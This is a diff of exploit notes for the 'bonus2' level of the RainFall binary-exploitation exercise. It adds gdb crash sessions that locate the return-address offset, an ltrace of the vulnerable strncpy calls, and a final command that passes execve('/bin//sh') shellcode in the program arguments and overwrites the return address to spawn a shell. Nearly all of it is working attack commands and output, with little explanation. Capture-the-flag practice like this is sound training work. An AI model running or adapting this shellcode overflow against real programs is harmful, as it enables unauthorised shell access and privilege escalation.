@@ -1,4 +1,28 @@
 
 export LANG=fi
 
-./bonus2 $(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A"*40') $(python -c 'print "B"*18 + "\xbf\xff\xf6\xa0"[::-1]')
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41366141 in ?? ()
+
+(gdb) print (char[4])0x41366141
+$1 = "Aa6A
+
+**
+** OFFSET 18
+**
+
+(gdb) r $(python -c 'print "A"*50') $(python -c 'print "A"*18 + "BBBB"')
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+bonus2@RainFall:~$ ltrace ./bonus2 $(python -c 'print "C"* 21 + "A"*50') $(python -c 'print "A"*18 + "BBBB"')
+**
+__libc_start_main(0x8048529, 3, 0xbffe70d4, 0x8048640, 0x80486b0 <unfinished ...>
+strncpy(0xbffe6fd0, "CCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAA"..., 40)
+strncpy(0xbffe6ff8, "AAAAAAAAAAAAAAAAAABBBB", 32)
+getenv("LANG")                                                                                  = "fi"
+**
+
+./bonus2 $(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A"*50') $(python -c 'print "A"*18 + "\xbf\xfe\x6f\xd0"[::-1]')
